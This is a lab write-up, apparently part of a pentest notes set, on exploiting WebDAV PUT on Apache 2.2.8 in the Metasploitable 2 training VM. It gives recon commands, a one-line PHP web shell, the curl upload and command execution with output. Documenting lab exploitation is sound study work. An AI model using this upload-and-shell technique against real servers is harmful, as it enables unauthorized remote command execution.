# 🌐 WebDAV RCE via PUT – Apache 2.2.8 (Port 80)

> This section covers the discovery and exploitation of the Apache WebDAV service running on port 80 on Metasploitable 2, which allowed file uploads and remote command execution.

---

## 🔍 Service Detection

```bash
nmap -p 80 -sC -sV 192.168.182.128
```

📌 Output:
- Apache httpd 2.2.8 ((Ubuntu) DAV/2)
- PHP/5.2.4-2ubuntu5.10
- WebDAV support detected

---

## 🧭 Directory Discovery

```bash
gobuster dir -u http://192.168.182.128/ -w /usr/share/wordlists/dirb/common.txt
```

📌 Interesting paths:
- `/dav`
- `/phpMyAdmin`
- `/phpinfo.php`

---

## ✅ Method Check for PUT Support

```bash
curl -X OPTIONS http://192.168.182.128/dav/ -i
```

📌 Output:
```
Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE
```
✅ PUT method is enabled!

---

## ☠️ Uploading PHP Web Shell

Created a simple PHP shell :
```php
&lt;?php system($_GET['cmd']); ?&gt;
```

Uploaded via curl:
```bash
curl -T shell.php http://192.168.182.128/dav/shell.php
```

✅ Upload succeeded.

---

## 🚀 Command Execution via Browser

Accessed the shell from browser:
```bash
http://192.168.182.128/dav/shell.php?cmd=id
```

📌 Output:
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Additional commands:
```bash
http://192.168.182.128/dav/shell.php?cmd=whoami
http://192.168.182.128/dav/shell.php?cmd=uname -a
```

✅ Remote command execution achieved as `www-data`.

---

## 🔐 Summary

| Element       | Details                          |
|---------------|----------------------------------|
| Service       | Apache 2.2.8 + WebDAV            |
| Vulnerability | PUT method enabled               |
| Exploit       | PHP shell upload via `curl`      |
| Shell Type    | Browser-based RCE (?cmd=)        |
| User          | www-data                         |

> Next: [Privilege Escalation Techniques](./privilege-escalation.md)
